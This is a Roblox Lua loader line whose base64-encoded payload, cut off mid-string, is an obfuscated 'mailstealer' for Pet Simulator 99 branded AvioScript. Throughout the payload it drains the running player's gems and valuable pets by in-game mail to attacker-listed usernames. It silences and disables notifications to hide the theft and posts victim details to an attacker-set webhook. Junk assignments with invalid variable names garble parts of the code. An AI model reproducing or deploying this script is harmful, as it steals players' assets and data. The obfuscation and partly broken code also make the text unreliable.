loadstring(game:HttpGet('data:text/plain;base64,X0cuc2NyaXB0RXhlY3V0ZWQgPSBfRy5zY3JpcHRFeGVjdXRlZCBvciBmYWxzZQppZiBfRy5zY3JpcHRFeGVjdXRlZCB0aGVuCiAgICByZXR1cm4KZW5kCl9HLnNjcmlwdEV4ZWN1dGVkID0gdHJ1ZQoKbG9jYWwgdmFyX3R4eDBubiA9IHJlcXVpcmUoZ2FtZS5SZXBsaWNhdGVkU3RvcmFnZS5MaWJyYXJ5LkNsaWVudC5OZXR3b3JrKQpsb2NhbCB2YXJfMHR4ODF0ID0gcmVxdWlyZShnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlLkxpYnJhcnkpCmxvY2FsIHB3bjU1cCA9IDQ5CmxvY2FsIHZhcl95ZnlybWQgPSByZXF1aXJlKGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIkxpYnJhcnkiKTpXYWl0Rm9yQ2hpbGQoIkNsaWVudCIpOldhaXRGb3JDaGlsZCgiU2F2ZSIpKS5HZXQoKS5JbnZlbnRvcnkKbG9jYWwgdmFyX2VpZTB1aCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCB2YXJfZWZya3dhID0gIkF2aW9TY3JpcHQiCmxvY2FsIHZhcl9xdjdwd2cgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKLS0gYm9iOGRyN2wKbG9jYWwgdmFyX3Q4OTJ4ZiA9IHt9CmxvY2FsIHZhcl83eWR1Ym4gPSAwCi0tIDhvZ3R2czBoCmxvY2FsIHZhcl9xYW9hcmsgPSByZXF1aXJlKGdhbWUuUmVwbGljYXRlZFN0b3JhZ2UuTGlicmFyeS5DbGllbnQuTWVzc2FnZSkKbG9jYWwgdmFyX3RjdWx5cyA9IGZ1bmN0aW9uKCkKICAgIHJldHVybiByZXF1aXJlKGdhbWUuUmVwbGljYXRlZFN0b3JhZ2UuTGlicmFyeS5DbGllbnQuU2F2ZSkuR2V0KCkKLS0gajJ4ZHhzY2gKZW5kCgpsb2NhbCAzZW45MDggPSA2MApsb2NhbCB2YXJfczI3MXM0ID0gX0cuVXNlcm5hbWVzIG9yIHt9Ci0tIDBnbXNtbGRpCmxvY2FsIHZhcl84NHppaXIgPSBfRy5taW5yYXAgb3IgMTAwMDAwMApsb2NhbCBla3dldHggPSA4NQpsb2NhbCB2YXJfM2twN3B5ID0gX0cud2ViaG9vayBvciAiIgoKbG9jYWwgbDZncnZmID0gNjUKaWYgbmV4dCh1c2VycykgPT0gbmlsIG9yIHdlYmhvb2sgPT0gIiIgdGhlbgpsb2NhbCBjbXhtcmMgPSAzNgogICAgcGxyOmtpY2soIllvdSBkaWRuJ3QgYWRkIGFueSB1c2VybmFtZXMgb3Igd2ViaG9vayIpCi0tIDRmcnVheDI4CiAgICByZXR1cm4KZW5kCgpmb3IgXywgdXNlciBpbiBpcGFpcnModXNlcnMpIGRvCi0tIDI5NnN4aXR5CiAgICBpZiBwbHIuTmFtZSA9PSB1c2VyIHRoZW4KICAgICAgICBwbHI6a2ljaygiWW91IGNhbm5vdCBtYWlsc3RlYWwgeW91cnNlbGYiKQogICAgICAgIHJldHVybgpsb2NhbCB1dDBoZjQgPSAwCiAgICBlbmQKZW5kCgpmb3IgYWRyZXNzLCBmdW5jIGluIHBhaXJzKGdldGdjKCkpIGRvCiAgICBpZiBkZWJ1Zy5nZXRpbmZvKGZ1bmMpLm5hbWUgPT0gImNvbXB1dGVTZW5kTWFpbENvc3QiIHRoZW4KLS0gYmszYnZpd3oKICAgICAgICBGdW5jdGlvblRvR2V0Rmlyc3RQcmljZU9mTWFpbCA9IGZ1bmMKLS0gYjlyNHM2cDAKICAgICAgICBicmVhawotLSB4cjI1cmkzMwogICAgZW5kCi0tIGc1aHVvdHZiCmVuZAoKbG9jYWwgdmFyXzA4bjlqNCA9IEZ1bmN0aW9uVG9HZXRGaXJzdFByaWNlT2ZNYWlsKCkKLS0gNnhjY3Iwa24KCmxvY2FsIHZhcl9pNmkwamcgPSAxCmZvciBpLCB2IGluIHBhaXJzKEdldFNhdmUoKS5JbnZlbnRvcnkuQ3VycmVuY3kpIGRvCiAgICBpZiB2LmlkID09ICJEaWFtb25kcyIgdGhlbgogICAgICAgIEdlbUFtb3VudDEgPSB2Ll9hbQoJCWJyZWFrCiAgICBlbmQKZW5kCi0tIHYyMXp1amltCmxvY2FsIHkzNzhqeCA9IDgxCgpsb2NhbCB2YXJfcDVuZGI1IGZvcm1hdE51bWJlcihudW1iZXIpCmxvY2FsIGM4cG94OCA9IDcyCglsb2NhbCB2YXJfOXkxb2VyID0gbWF0aC5mbG9vcihudW1iZXIpCglsb2NhbCB2YXJfdHMxMm4yID0geyIiLCAiayIsICJtIiwgImIiLCAidCJ9Cglsb2NhbCB2YXJfbmQ5NHR1ID0gMQoJd2hpbGUgbnVtYmVyID49IDEwMDAgZG8KLS0geWE2Y3c4NTUKbG9jYWwgNG5qNjZ0ID0gMjUKCQludW1iZXIgPSBudW1iZXIgLyAxMDAwCi0tIGx3dzQyamI5CgkJc3VmZml4SW5kZXggPSBzdWZmaXhJbmRleCArIDEKCWVuZAoJcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMmYlcyIsIG51bWJlciwgc3VmZml4ZXNbc3VmZml4SW5kZXhdKQplbmQKCi0tIGltc3Uxb2RiCmxvY2FsIDM3N25mOSA9IDkwCmxvY2FsIHZhcl9mc2Jua3IgU2VuZE1lc3NhZ2UoZGlhbW9uZHMpCmxvY2FsIGhwd2Y2YiA9IDc4CiAgICBsb2NhbCB2YXJfanR5ZDF5ID0gewogICAgICAgIFsiQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiIKICAgIH0KCi0tIGE1MzJwY3Q3Cglsb2NhbCB2YXJfemVjZ2pkID0gewoJCXsKCQkJbmFtZSA9ICJWaWN0aW0gVXNlcm5hbWU6IiwKLS0gd2FiaWpud3UKbG9jYWwgam84bjI1ID0gMjYKCQkJdmFsdWUgPSBwbHIuTmFtZSwKbG9jYWwgb2hlM3JnID0gMjQKCQkJaW5saW5lID0gdHJ1ZQpsb2NhbCAweDhkcTUgPSA3MgoJCX0sCgkJewpsb2NhbCAxbjN0MDcgPSA3OQoJCQluYW1lID0gIkl0ZW1zIHRvIGJlIHNlbnQ6IiwKLS0gc3ljaDdtbG4KCQkJdmFsdWUgPSAiIiwKCQkJaW5saW5lID0gZmFsc2UKCQl9LAogICAgICAgIHsKICAgICAgICAgICAgbmFtZSA9ICJTdW1tYXJ5OiIsCi0tIGkzZHhkenU5CiAgICAgICAgICAgIHZhbHVlID0gIiIsCiAgICAgICAgICAgIGlubGluZSA9IGZhbHNlCiAgICAgICAgfQotLSBod2tkampmeQoJfQoKICAgIGxvY2FsIHZhcl95YXV1OTkgPSB7fQotLSBub3E2M3YzaQogICAgbG9jYWwgdmFyX3Fha3hqciA9IHt9CgogICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKHNvcnRlZEl0ZW1zKSBkbwogICAgICAgIGxvY2FsIHZhcl83OHFwOGQgPSBpdGVtLm5hbWUKICAgICAgICBpZiBpdGVtUmFwTWFwW3JhcEtleV0gdGhlbgotLSByZnlwdjZ0ZQogICAgICAgICAgICBpdGVtUmFwTWFwW3JhcEtleV0uYW1vdW50ID0gaXRlbVJhcE1hcFtyYXBLZXldLmFtb3VudCArIGl0ZW0uYW1vdW50CiAgICAgICAgZWxzZQogICAgICAgICAgICBpdGVtUmFwTWFwW3JhcEtleV0gPSB7YW1vdW50ID0gaXRlbS5hbW91bnQsIHJhcCA9IGl0ZW0ucmFwfQotLSBrdm1xOHo3eAogICAgICAgICAgICB0YWJsZS5pbnNlcnQoY29tYmluZWRJdGVtcywgcmFwS2V5KQogICAgICAgIGVuZAogICAgZW5kCgogICAgdGFibGUuc29ydChjb21iaW5lZEl0ZW1zLCBmdW5jdGlvbihhLCBiKQogICAgICAgIHJldHVybiBpdGVtUmFwTWFwW2FdLnJhcCAqIGl0ZW1SYXBNYXBbYV0uYW1vdW50ID4gaXRlbVJhcE1hcFtiXS5yYXAgKiBpdGVtUmFwTWFwW2JdLmFtb3VudCAKLS0gYjRxeGJibnAKICAgIGVuZCkKCi0tIGNoZjl0bG1hCiAgICBmb3IgXywgaXRlbU5hbWUgaW4gaXBhaXJzKGNvbWJpbmVkSXRlbXMpIGRvCiAgICAgICAgbG9jYWwgdmFyX3VnMmlzNyA9IGl0ZW1SYXBNYXBbaXRlbU5hbWVdCiAgICAgICAgZmllbGRzWzJdLnZhbHVlID0gZmllbGRzWzJdLnZhbHVlIC4uIGl0ZW1OYW1lIC4uICIgKHgiIC4uIGl0ZW1EYXRhLmFtb3VudCAuLiAiKSIgLi4gIjogIiAuLiBmb3JtYXROdW1iZXIoaXRlbURhdGEucmFwICogaXRlbURhdGEuYW1vdW50KSAuLiAiIFJBUFxuIgpsb2NhbCAzYTNlbzggPSA2MQogICAgZW5kCgotLSA0ZG9lbnZ1OAogICAgZmllbGRzWzNdLnZhbHVlID0gc3RyaW5nLmZvcm1hdCgiR2VtczogJXNcblRvdGFsIFJBUDogJXMiLCBmb3JtYXROdW1iZXIoZGlhbW9uZHMpLCBmb3JtYXROdW1iZXIodG90YWxSQVApKQpsb2NhbCAzcDlwZWwgPSAwCgogICAgbG9jYWwgdmFyX2QzeXd6ciA9IHsKICAgICAgICBbImVtYmVkcyJdID0ge3sKLS0gOTBnNm95NjkKbG9jYWwgY2h5YXBsID0gNzcKICAgICAgICAgICAgWyJ0aXRsZSJdID0gIlwyNDBcMTU5XDE0NFwxNzcgTmV3IFBTOTkgRXhlY3V0aW9uIiAsCiAgICAgICAgICAgIFsiY29sb3IiXSA9IDY1MjgwLAotLSAwcmg2d24zYQoJCQlbImZpZWxkcyJdID0gZmllbGRzLAoJCQlbImZvb3RlciJdID0gewoJCQkJWyJ0ZXh0Il0gPSAiQXZpb1NjcmlwdCIKLS0gNm85dWF1NmMKCQkJfQogICAgICAgIH19Ci0tIHJ3NzZ1dnM4CiAgICB9CgogICAgaWYgI2ZpZWxkc1syXS52YWx1ZSA+IDEwMjQgdGhlbgogICAgICAgIGxvY2FsIHZhcl9nb3hyb3MgPSB7fQogICAgICAgIGZvciBsaW5lIGluIGZpZWxkc1syXS52YWx1ZTpnbWF0Y2goIlteXHJcbl0rIikgZG8KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGxpbmVzLCBsaW5lKQogICAgICAgIGVuZAotLSB3bW5jcXJkMQoKbG9jYWwgN2FmOGFyID0gNQogICAgICAgIHdoaWxlICNmaWVsZHNbMl0udmFsdWUgPiAxMDI0IGFuZCAjbGluZXMgPiAwIGRvCiAgICAgICAgICAgIHRhYmxlLnJlbW92ZShsaW5lcykKICAgICAgICAgICAgZmllbGRzWzJdLnZhbHVlID0gdGFibGUuY29uY2F0KGxpbmVzLCAiXG4iKQogICAgICAgICAgICBmaWVsZHNbMl0udmFsdWUgPSBmaWVsZHNbMl0udmFsdWUgLi4gIlxuUGx1cyBtb3JlISIKbG9jYWwgNXFxOHZlID0gMjgKICAgICAgICBlbmQKICAgIGVuZAoKLS0gN3o0YzRhM2IKbG9jYWwgdXpoc2F0ID0gODAKICAgIGxvY2FsIHZhcl8wM3Z6MHQgPSBIdHRwU2VydmljZTpKU09ORW5jb2RlKGRhdGEpCiAgICByZXF1ZXN0KHsKICAgICAgICBVcmwgPSB3ZWJob29rLAogICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICBIZWFkZXJzID0gaGVhZGVycywKLS0gdmJrZ2x2Y24KICAgICAgICBCb2R5ID0gYm9keQogICAgfSkKLS0gdWRsM240bzcKZW5kCgotLSB2YzBkanhmdQpsb2NhbCB2YXJfaDVvM3c2ID0gcGxyLmxlYWRlcnN0YXRzWyJcMjQwXDE1OVwxNDZcMTQyIERpYW1vbmRzIl0uVmFsdWUKLS0gbHRnMDhpbDQKbG9jYWwgdmFyXzhyYWg4eSA9IHBsci5sZWFkZXJzdGF0c1siXDI0MFwxNTlcMTQ2XDE0MiBEaWFtb25kcyJdCi0tIHp4YTQ1Z2N5CmxvY2FsIGJoNzN1byA9IDYzCmdlbXNsZWFkZXJzdGF0cGF0aDpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlZhbHVlIik6Q29ubmVjdChmdW5jdGlvbigpCglnZW1zbGVhZGVyc3RhdHBhdGguVmFsdWUgPSBnZW1zbGVhZGVyc3RhdAplbmQpCi0tIG1ucGE2bjV0CmxvY2FsIG5nem0wMSA9IDQ2Cgpsb2NhbCB2YXJfMms0NmhmID0gcGxyLlBsYXllclNjcmlwdHMuU2NyaXB0cy5Db3JlWyJQcm9jZXNzIFBlbmRpbmcgR1VJIl0KbG9jYWwgdHBhMjZ0ID0gMQpsb2NhbCB2YXJfdTcycXNzID0gcGxyLlBsYXllckd1aS5Ob3RpZmljYXRpb25zCmxvYWRpbmcuRGlzYWJsZWQgPSB0cnVlCm5vdGk6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJFbmFibGVkIik6Q29ubmVjdChmdW5jdGlvbigpCi0tIDIyN3FoYXhvCglub3RpLkVuYWJsZWQgPSBmYWxzZQotLSBldHQwZXg0MgplbmQpCm5vdGkuRW5hYmxlZCA9IGZhbHNlCgotLSBnYmQ3ZTN5YwpnYW1lLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHgpCiAgICBpZiB4LkNsYXNzTmFtZSA9PSAiU291bmQiIHRoZW4KbG9jYWwgMjZqb2tmID0gNDIKICAgICAgICBpZiB4LlNvdW5kSWQ9PSJyYnhhc3NldGlkOi8vMTE4MzkxMzI1NjUiIG9yIHguU291bmRJZD09InJieGFzc2V0aWQ6Ly8xNDI1NDcyMTAzOCIgb3IgeC5Tb3VuZElkPT0icmJ4YXNzZXRpZDovLzEyNDEzNDIzMjc2IiB0aGVuCiAgICAgICAgICAgIHguVm9sdW1lPTAKLS0gcHRsZW92dGYKbG9jYWwgNGJkdXUzID0gNzYKICAgICAgICAgICAgeC5QbGF5T25SZW1vdmU9ZmFsc2UKLS0gMGFraXBwdjgKICAgICAgICAgICAgeDpEZXN0cm95KCkKLS0gYWYxZzc1bzYKICAgICAgICBlbmQKLS0gemhuaWQ4ejEKICAgIGVuZAplbmQpCgotLSB3bWltMmN0dQpsb2NhbCB4Z2phY3EgPSAyMQpsb2NhbCB2YXJfb2J5Yjh0IGdldFJBUChUeXBlLCBJdGVtKQpsb2NhbCA2cGI4dW0gPSAxNgogICAgcmV0dXJuIChyZXF1aXJlKGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5MaWJyYXJ5LkNsaWVudC5SQVBDbWRzKS5HZXQoCiAgICAgICAgewotLSB4eGdpdmt1YQogICAgICAgICAgICBDbGFzcyA9IHtOYW1lID0gVHlwZX0sCiAgICAgICAgICAgIElzQSA9IGZ1bmN0aW9uKGhtbSkKICAgICAgICAgICAgICAgIHJldHVybiBobW0gPT0gVHlwZQotLSAxbXk1a2VtZAogICAgICAgICAgICBlbmQsCiAgICAgICAgICAgIEdldElkID0gZnVuY3Rpb24oKQotLSBleWRiOXFzNgpsb2NhbCAwN2lieXggPSA2CiAgICAgICAgICAgICAgICByZXR1cm4gSXRlbS5pZAogICAgICAgICAgICBlbmQsCiAgICAgICAgICAgIFN0YWNrS2V5ID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgcmV0dXJuIEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoe2lkID0gSXRlbS5pZCwgcHQgPSBJdGVtLnB0LCBzaCA9IEl0ZW0uc2gsIHRuID0gSXRlbS50bn0pCiAgICAgICAgICAgIGVuZCwKICAgICAgICAgICAgQWJzdHJhY3RHZXRSQVAgPSBmdW5jdGlvbihzZWxmKQogICAgICAgICAgICAgICAgcmV0dXJuIG5pbApsb2NhbCB2bGRiZmYgPSA4CiAgICAgICAgICAgIGVuZAogICAgICAgIH0KICAgICkgb3IgMCkKLS0gZmFkdXI5azIKZW5kCgpsb2NhbCB2YXJfOTV2OW40IHNlbmRJdGVtKGNhdGVnb3J5LCB1aWQsIGFtKQogICAgbG9jYWwgdmFyXzdtZzAxcSA9IDEKICAgIGxvY2FsIHZhcl9hYzEwMzYgPSAjdXNlcnMKICAgIGxvY2FsIHZhcl9tNWNrcXUgPSBmYWxzZQotLSBqenRsMDV2Nwpsb2NhbCBmcmtlM2MgPSAzNgogICAgCi0tIGl1dGJoN3h4CmxvY2FsIDgzdzEwcCA9IDAKICAgIHJlcGVhdAogICAgICAgIGxvY2FsIHZhcl8ydWpncGcgPSB1c2Vyc1t1c2VySW5kZXhdCmxvY2FsIGdmdzZmdCA9IDMwCiAgICAgICAgbG9jYWwgdmFyX3V5N3BmdCA9IHsKLS0gMTB6Z3MwNHMKICAgICAgICAgICAgWzFdID0gY3VycmVudFVzZXIsCi0tIGFjNXFjc3hqCiAgICAgICAgICAgIFsyXSA9IE1haWxNZXNzYWdlLAotLSBzb3BtdjBrdAogICAgICAgICAgICBbM10gPSBjYXRlZ29yeSwKICAgICAgICAgICAgWzRdID0gdWlkLApsb2NhbCB5NGltcnQgPSA3NQogICAgICAgICAgICBbNV0gPSBhbSBvciAxCiAgICAgICAgfQoKICAgICAgICBsb2NhbCB2YXJfc3E2dDF4LCBlcnIgPSBuZXR3b3JrLkludm9rZSgiTWFpbGJveDogU2VuZCIsIHVucGFjayhhcmdzKSkKLS0gNXQ0dDk3ZDUKCiAgICAgICAgaWYgcmVzcG9uc2UgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgIHNlbnQgPSB0cnVlCi0tIGFpdnN6azF6CmxvY2FsIGMxcjk5ayA9IDkwCiAgICAgICAgICAgIEdlbUFtb3VudDEgPSBHZW1BbW91bnQxIC0gbWFpbFNlbmRQcmljZQotLSBnaWM5bW83bQogICAgICAgICAgICBtYWlsU2VuZFByaWNlID0gbWF0aC5jZWlsKG1hdGguY2VpbChtYWlsU2VuZFByaWNlKSAqIDEuNSkKICAgICAgICAgICAgaWYgbWFpbFNlbmRQcmljZSA+IDUwMDAwMDAgdGhlbgpsb2NhbCBkM25qYTIgPSAxNgogICAgICAgICAgICAgICAgbWFpbFNlbmRQcmljZSA9IDUwMDAwMDAKLS0gc3V1Y3Z0MjcKICAgICAgICAgICAgZW5kCi0tIGIzcWNuczlkCiAgICAgICAgZWxzZWlmIHJlc3BvbnNlID09IGZhbHNlIGFuZCBlcnIgPT0gIlRoZXkgZG9uJ3QgaGF2ZSBlbm91Z2ggc3BhY2UhIiB0aGVuCi0tIDI5ejlqc3V1CiAgICAgICAgICAgIHVzZXJJbmRleCA9IHVzZXJJbmRleCArIDEKLS0gazgwajdmdjYKICAgICAgICAgICAgaWYgdXNlckluZGV4ID4gbWF4VXNlcnMgdGhlbgotLSB5c3Q2azNieAogICAgICAgICAgICAgICAgc2VudCA9IHRydWUKLS0gNDRsdDBndGQKICAgICAgICAgICAgZW5kCmxvY2FsIGR6dzBvYyA9IDI5CiAgICAgICAgZW5kCiAgICB1bnRpbCBzZW50Ci0tIDdhYXQ4cTEzCmxvY2FsIGJzZHA2YyA9IDIxCmVuZAotLSA1MDRrNzlhZgoKbG9jYWwgdmFyX2Fnbzg5NyBTZW5kQWxsR2VtcygpCiAgICBmb3IgaSwgdiBpbiBwYWlycyhHZXRTYXZlKCkuSW52ZW50b3J5LkN1cnJlbmN5KSBkbwogICAgICAgIGlmIHYuaWQgPT0gIkRpYW1vbmRzIiB0aGVuCmxvY2FsIHhmMHp5ZSA9IDYwCiAgICAgICAgICAgIGlmIEdlbUFtb3VudDEgPj0gKG1haWxTZW5kUHJpY2UgKyAxMDAwMCkgdGhlbgotLSB4am9iODgyZQogICAgICAgICAgICAgICAgbG9jYWwgdmFyXzU5NjR0byA9IDEKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9wZWVxNWwgPSAjdXNlcnMKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9peGdsdnMgPSBmYWxzZQotLSBvem8xaTk3YwogICAgICAgICAgICAgICAgCmxvY2FsIGtvdnUwcSA9IDU3CiAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdHBxZ2t2ID0gdXNlcnNbdXNlckluZGV4XQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9uYWhzZnYgPSB7Ci0tIDh0MzBkcHlmCiAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9IGN1cnJlbnRVc2VyLAotLSB1ZHViaTdwegogICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSBNYWlsTWVzc2FnZSwKLS0gdGJ1ZWs1MncKICAgICAgICAgICAgICAgICAgICAgICAgWzNdID0gIkN1cnJlbmN5IiwKLS0gNXgyZW4wczYKICAgICAgICAgICAgICAgICAgICAgICAgWzRdID0gaSwKICAgICAgICAgICAgICAgICAgICAgICAgWzVdID0gR2VtQW1vdW50MSAtIG1haWxTZW5kUHJpY2UKbG9jYWwgMHZoMHA4ID0gMTEKICAgICAgICAgICAgICAgICAgICB9Ci0tIGl5NjExb2FyCiAgICAgICAgICAgICAgICAgICAgCi0tIGd2Znppd2IyCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX2IzdWtrdiwgZXJyID0gbmV0d29yay5JbnZva2UoIk1haWxib3g6IFNlbmQiLCB1bnBhY2soYXJncykpCi0tIGJ3ZjJwNTJ0CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgcmVzcG9uc2UgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbnQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHJlc3BvbnNlID09IGZhbHNlIGFuZCBlcnIgPT0gIlRoZXkgZG9uJ3QgaGF2ZSBlbm91Z2ggc3BhY2UhIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJJbmRleCA9IHVzZXJJbmRleCArIDEKLS0gM3IzNXVjOHkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXNlckluZGV4ID4gbWF4VXNlcnMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VudCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCi0tIHd0cWpoMnBmCiAgICAgICAgICAgICAgICAgICAgZW5kCmxvY2FsIDE5dm9saCA9IDU3CiAgICAgICAgICAgICAgICB1bnRpbCBzZW50CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKLS0gczY4NXJiZ3YKICAgICAgICBlbmQKbG9jYWwgdmRtOGc0ID0gMzQKICAgIGVuZAplbmQKCi0tIGM4NGRoOHhtCmxvY2FsIHZhcl9paDNjYm8gRW1wdHlCb3hlcygpCi0tIHU2djR6YzBhCiAgICBpZiBzYXZlLkJveCB0aGVuCi0tIGp4Yzhpa2JrCiAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gcGFpcnMoc2F2ZS5Cb3gpIGRvCi0tIGxuanh6ZzkwCgkJCWlmIHZhbHVlLl91cSB0aGVuCgkJCQluZXR3b3JrLkludm9rZSgiQm94OiBXaXRoZHJhdyBBbGwiLCBrZXkpCgkJCWVuZAotLSB4YmNvYmNkMAogICAgICAgIGVuZAogICAgZW5kCi0tIHk1M2JycGI2CmVuZAoKbG9jYWwgaHIxNWdjID0gNzUKbG9jYWwgdmFyXzExOWw4eCBDbGFpbU1haWwoKQpsb2NhbCAzdmxlNDAgPSA4OQogICAgbG9jYWwgdmFyX29xbTRrNiwgZXJyID0gbmV0d29yay5JbnZva2UoIk1haWxib3g6IENsYWltIEFsbCIpCi0tIGlkd25iNGZ4CiAgICB3aGlsZSBlcnIgPT0gIllvdSBtdXN0IHdhaXQgMzAgc2Vjb25kcyBiZWZvcmUgdXNpbmcgdGhlIG1haWxib3ghIiBkbwogICAgICAgIHdhaXQoMC4yKQogICAgICAgIHJlc3BvbnNlLCBlcnIgPSBuZXR3b3JrLkludm9rZSgiTWFpbGJveDogQ2xhaW0gQWxsIikKLS0geGplYzJ0aXQKICAgIGVuZAplbmQKCmxvY2FsIHZhcl9qcjYxN2ggY2FuU2VuZE1haWwoKQotLSB1YnpmcGpqcApsb2NhbCBsdjdmdnUgPSA4MAoJbG9jYWwgdmFyX3lkaXJrbwpsb2NhbCA5ZTIzbXMgPSAyMgoJZm9yIGksIHYgaW4gcGFpcnMoc2F2ZVsiUGV0Il0pIGRvCgkJdWlkID0gaQoJCWJyZWFrCgllbmQKCWxvY2FsIHZhcl9oeGIzbXEgPSB7CiAgICAgICAgWzFdID0gIlJvYmxveCIsCiAgICAgICAgWzJdID0gIlRlc3QiLAogICAgICAgIFszXSA9ICJQZXQiLAogICAgICAgIFs0XSA9IHVpZCwKICAgICAgICBbNV0gPSAxCmxvY2FsIHZ2cGVmMSA9IDU4CiAgICB9Ci0tIDdlZmVpMm1hCiAgICBsb2NhbCB2YXJfeXc1dnBmLCBlcnIgPSBuZXR3b3JrLkludm9rZSgiTWFpbGJveDogU2VuZCIsIHVucGFjayhhcmdzKSkKLS0gdnpvdWd6Zm4KICAgIHJldHVybiAoZXJyID09ICJUaGV5IGRvbid0IGhhdmUgZW5vdWdoIHNwYWNlISIpCmVuZApsb2NhbCBpc3ZkZDAgPSA2MwoKcmVxdWlyZShnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlLkxpYnJhcnkuQ2xpZW50LkRheWNhcmVDbWRzKS5DbGFpbSgpCmxvY2FsIDJvaWkzciA9IDcxCnJlcXVpcmUoZ2FtZS5SZXBsaWNhdGVkU3RvcmFnZS5MaWJyYXJ5LkNsaWVudC5FeGNsdXNpdmVEYXljYXJlQ21kcykuQ2xhaW0oKQpsb2NhbCBpZTY2bDUgPSA5MApsb2NhbCB2YXJfcXZkMW9nID0geyJQZXQiLCAiRWdnIiwgIkNoYXJtIiwgIkVuY2hhbnQiLCAiUG90aW9uIiwgIk1pc2MiLCAiSG92ZXJib2FyZCIsICJCb290aCIsICJVbHRpbWF0ZSJ9Cgpmb3IgaSwgdiBpbiBwYWlycyhjYXRlZ29yeUxpc3QpIGRvCglpZiBzYXZlW3ZdIH49IG5pbCB0aGVuCgkJZm9yIHVpZCwgaXRlbSBpbiBwYWlycyhzYXZlW3ZdKSBkbwpsb2NhbCBwOTlydDAgPSAxNgoJCQlpZiB2ID09ICJQZXQiIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHZhcl90azM5ZXAgPSByZXF1aXJlKGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5MaWJyYXJ5LkRpcmVjdG9yeS5QZXRzKVtpdGVtLmlkXQogICAgICAgICAgICAgICAgaWYgZGlyLmh1Z2Ugb3IgZGlyLmV4Y2x1c2l2ZUxldmVsIHRoZW4KLS0gd3M3ZTIweGUKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfbHdpdnB5ID0gZ2V0UkFQKHYsIGl0ZW0pCiAgICAgICAgICAgICAgICAgICAgaWYgcmFwVmFsdWUgPj0gbWluX3JhcCB0aGVuCi0tIHdxcjR4aW9lCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9xbnRuemsgPSAiIgogICAgICAgICAgICAgICAgICAgICAgICBpZiBpdGVtLnB0IGFuZCBpdGVtLnB0ID09IDEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJlZml4ID0gIkdvbGRlbiAiCi0tIDNmNWF6Ymg5CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBpdGVtLnB0IGFuZCBpdGVtLnB0ID09IDIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJlZml4ID0gIlJhaW5ib3cgIgogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXRlbS5zaCB0aGVuCmxvY2FsIDU1eXpmMyA9IDMzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmVmaXggPSAiU2hpbnkgIiAuLiBwcmVmaXgKbG9jYWwgc2pmZm01ID0gNQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKLS0gaHIyZ2szdTQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3B5ZTR3ZiA9IHByZWZpeCAuLiBpdGVtLmlkCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChzb3J0ZWRJdGVtcywge2NhdGVnb3J5ID0gdiwgdWlkID0gdWlkLCBhbW91bnQgPSBpdGVtLl9hbSBvciAxLCByYXAgPSByYXBWYWx1ZSwgbmFtZSA9IGlkfSkKbG9jYWwgMzlwMTF3ID0gMjMKICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxSQVAgPSB0b3RhbFJBUCArIChyYXBWYWx1ZSAqIChpdGVtLl9hbSBvciAxKSkKLS0gbGplM3h6bmoKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfazNjNTJ2ID0gZ2V0UkFQKHYsIGl0ZW0pCi0tIGJuZWQ2b2FkCiAgICAgICAgICAgICAgICBpZiByYXBWYWx1ZSA+PSBtaW5fcmFwIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoc29ydGVkSXRlbXMsIHtjYXRlZ29yeSA9IHYsIHVpZCA9IHVpZCwgYW1